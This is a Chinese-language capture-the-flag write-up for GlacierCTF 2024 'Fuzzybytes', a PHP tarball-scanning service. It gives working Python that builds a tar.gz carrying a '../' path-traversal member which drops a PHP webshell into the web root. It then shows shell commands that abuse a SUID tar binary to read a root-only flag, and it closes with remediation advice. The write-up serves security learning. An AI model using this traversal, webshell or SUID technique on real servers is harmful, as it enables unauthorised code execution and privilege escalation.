# GlacierCTF 2024 Fuzzybytes

## 题目简述

Fuzzybytes 是一个允许上传 `.tar.gz` 进行“恶意代码扫描”的 PHP 服务。上传入口把压缩包保存到 `/tmp`，再调用 Python 脚本用 `tarfile.extractall("/tmp/files_for_checking")` 解包。程序只检查上传文件扩展名是否为 `gz`，没有验证归档成员最终落点。

通过 tar 成员名中的 `../` 可以把 PHP webshell 写进 Apache 可访问且 `www-data` 可写的 `/var/www/html/databases`。容器又错误地给 `/bin/tar` 设置 SUID root，拿到 Web 命令执行后可借 tar 读取 `/root/flag.txt`。

## 解题过程

### 1. 确认路径穿越写入点

上传逻辑本身使用 `basename()`，所以无法通过 HTTP 文件名改变 `/tmp/<name>` 的落点：

```php
$targetFile = "/tmp/" . basename($_FILES["file"]["name"]);
exec("python3 /usr/check_for_malicious_code.py " . escapeshellarg($targetFile));
```

真正的问题在压缩包内部：

```python
with tarfile.open(tar_file_path, "r:gz") as tar:
    tar.extractall("/tmp/files_for_checking")
```

题目环境中的 Python 解包没有启用拒绝越界路径的 filter。成员名

```text
../../var/www/html/databases/rev_shell.php
```

从 `/tmp/files_for_checking` 向上两级后落到 Web 根目录。Dockerfile 已执行：

```dockerfile
RUN chown www-data:www-data /var/www/html/databases
```

因此 Apache 用户有权创建该文件。

### 2. 构造 tar.gz webshell

可以完全在内存中生成归档：

```python
from io import BytesIO
import tarfile

payload = b"<?php echo shell_exec($_GET['cmd']); ?>"
buf = BytesIO()

with tarfile.open(fileobj=buf, mode="w:gz") as tar:
    info = tarfile.TarInfo(
        "../../var/www/html/databases/rev_shell.php"
    )
    info.size = len(payload)
    tar.addfile(info, BytesIO(payload))

open("rce.tar.gz", "wb").write(buf.getvalue())
```

以 multipart 文件字段 `file` 上传后，访问：

```text
/databases/rev_shell.php?cmd=id
```

即可确认以 `www-data` 身份执行命令。扫描脚本随后删除的只是 `/tmp/files_for_checking`，不会清理由路径穿越写到站点目录的文件。

### 3. 利用 SUID tar 读取 root flag

Dockerfile 还包含：

```dockerfile
COPY ./flag.txt /root/flag.txt
RUN chmod +s /bin/tar
```

`/bin/tar` 运行时保留有效 UID 0。官方 exploit 通过 webshell 执行：

```sh
cd /tmp && \
tar czf flag.tar.gz /root/flag.txt && \
tar xzf flag.tar.gz && \
cat ./root/flag.txt
```

第一步由 SUID tar 读取 root-only 文件并写入归档，第二步把内容解到当前目录，最后由 `www-data` 读取副本。返回结果为：

```text
gctf{c0nGr4tZ_on_Z1p_sLiDinG_4nD_Tar_diving}
```

## 方法总结

完整链条是“tar 成员路径穿越任意写 → Web 目录 PHP shell → SUID tar 特权文件读取”。修复不能只检查上传文件名或扩展名；应逐项规范化归档成员路径，确认最终路径仍位于独立临时目录，拒绝绝对路径、`..` 与危险链接，并在无执行权限的隔离进程中解包。`tar` 也不应设置 SUID，容器内读取 flag 的特权边界必须与 Web 用户分离。
